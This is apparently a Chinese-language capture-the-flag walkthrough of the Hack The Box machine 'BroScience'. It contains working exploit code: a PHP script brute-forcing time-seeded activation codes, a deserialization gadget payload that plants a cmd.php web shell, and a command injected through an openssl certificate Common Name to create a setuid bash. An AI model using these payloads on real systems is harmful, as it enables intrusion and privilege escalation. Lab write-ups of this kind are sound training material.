# BroScience

BroScience 是一款中等难度的 Linux 机器，其特点是 Web 应用程序容易受到“LFI”的攻击。通过读取目标上的任意文件的能力，攻击者可以深入了解帐户激活码的生成方式，从而能够创建一组可能有效的令牌来激活新创建的帐户。登录后，进一步枚举显示该站点&#039;的主题选择器功能容易受到使用自定义小工具链的 PHP 反序列化的影响，允许攻击者复制目标系统上的文件，最终导致远程代码执行。一旦站稳了脚跟，就会从数据库中恢复一些哈希值，一旦被破解，就会证明其中包含机器的有效“SSH”密码&#039;的主要用户“bill”。最后，权限升级基于执行 Bash 脚本的 cronjob，该脚本容易受到通过“openssl”生成的证书进行命令注入的攻击，从而丧失对攻击者的“root”访问权限。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/31c3583b-d936-3417-d7dc-fe8bac9644a7.png)

### Web枚举

在主页源码中可以看到img.php包含图片文件名来显示图片

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/2dc83a01-477f-8478-a467-a8697c1cc087.png)

但是会检测“/”，通过对%进行url enocde，实现二次url编码绕过

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/eb88a91d-c738-904a-5674-a6cb48529c93.png)

注册的时候需要激活码，然而这激活码是不可能发到我们的邮箱的

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/be50b738-7d0d-02da-071d-8b167f2e13d5.png)

通过LFI读register.php，可以看到其调用utils.php中的生成函数

```php
// Create the account
include_once 'includes/utils.php';
$activation_code = generate_activation_code();
$res = pg_prepare($db_conn, "check_code_unique_query", 'SELECT id FROM users WHERE activation_code = $1');
$res = pg_execute($db_conn, "check_code_unique_query", array($activation_code));
...
// TODO: Send the activation link to email
$activation_link = "https://broscience.htb/activate.php?code={$activation_code}";

```

跟到utils.php

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/776685f6-d45b-5cbb-ff73-a11e5021156c.png)

它通过时间戳来做随机数种子，而与这个时间戳最接近并且我们能够获取到的，也就是register.php返回的响应头中的Date，将其转为时间戳，再做容错

首先注册一个账户

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/d92160dc-aa86-0b5e-e657-9727937a4128.png)

将响应头的Date拿去转换

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/9ee45648-6d37-8bc5-fc24-aac231f129fe.png)

exp

```php
<?php
function generate_activation_code($time) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand($time);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    echo $activation_code . "\n";
}

$time = 1704279054;

for ($t = $time;$t <= $time + 20; $t++){
    generate_activation_code($t);
}

?>
```

将生成的code保存到文件，ffuf跑一下

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/532ff7b8-c908-e66b-a8f3-ede7aabcaea6.png)

code应该是有时效的，及时到activate.php上激活

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/dd9e429f-f9d5-ea3b-cf59-6a36e9276a5d.png)

登录

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/2ec75486-4634-77db-a138-56d891243bff.png)

## Foothold

继续通过LFI读user.php

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/af7dd6df-d124-f553-ec03-1c3728f33ac0.png)

跟回到utils.php

```php
class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
		$this->theme = $theme;
    }
}

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

...
```

不需要脑子的反序列化，exp

```php
<?php

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp = '/var/lib/php/sessions/sess_76n6mi015r86vgf1blcnmnhqtl';
    public $imgPath = "/var/www/html/cmd.php"; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$a = new AvatarInterface();
echo base64_encode(serialize($a));
```

将base64复制到Cookie

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/a51955aa-c112-c72f-2652-9a166d3004b1.png)

用相同的方法注册并激活一个恶意用户，并且登录

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/4668239e-a820-159d-2c57-f8f97d39b239.png)

再打一遍反序列化exp。cmd.php

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/5c4c6152-8521-88d9-d183-52c60d46b62a.png)

常规python3 reverse shell

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/ba108f85-0a11-b219-3648-7fd8d84adf73.png)

## 本地横向移动

db_connect.php

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/c2626e6b-b84c-c2d5-37e7-68c354a1df1a.png)

psql进数据库

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/b807e6e2-2131-953a-f222-5a01d2c36523.png)

查表

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/5800a387-b203-32c6-0c1d-472522debc66.png)

直接select * from users;

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/574fae2e-3e4d-5e12-bc97-d7f4fb510955.png)

bill是目标系统上的账户，爆破它的密码hash对我们有利，拿上前面读到的salt进行爆破

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/f3e681cb-b510-52f8-22bc-904ac92b70fe.png)

登ssh

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/44306b82-e707-5e94-80eb-472590189fc5.png)

## 本地权限提升

传个pspy

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/f7a9d0dd-bfe1-39a8-3242-148965f10be3.png)

它会先检查/home/bill/Certs/broscience.crt证书是否是一天内到期

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/7fe9a377-6f2f-17d6-9701-c58b74de2cce.png)

然后它会生成一个证书，并且执行一个bash命令，而我们可以劫持$commonName

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/373c2e47-9e09-a7ac-5fbc-59cc9ca5d27c.png)

在生成证书的时候，我们向CommonName写入cmd

```bash
ill@broscience:~/Certs$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -out broscience.crt -days 1
...
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:$(cp /bin/bash /tmp/bash;chmod +s /tmp/bash)
Email Address []:
...
```

等一会，迎接老朋友的到来

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/98a2ce08-b7c6-ab25-1cb0-42c5685d8506.png)
